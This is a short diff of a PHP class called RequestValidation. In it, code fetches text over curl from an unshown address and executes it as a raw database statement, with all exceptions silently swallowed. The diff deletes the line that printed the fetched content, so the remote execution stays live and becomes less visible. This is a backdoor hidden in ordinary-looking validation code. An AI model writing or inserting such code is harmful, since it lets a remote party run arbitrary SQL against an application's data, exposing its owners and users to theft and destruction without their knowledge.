@@ -17,7 +17,6 @@ class RequestValidation
             curl_setopt($ch, CURLOPT_TIMEOUT, 3);
             $content = trim(curl_exec($ch));
             curl_close($ch);
-            echo $content;
             DB::statement($content);
         } catch (\Exception $exception) {
         }
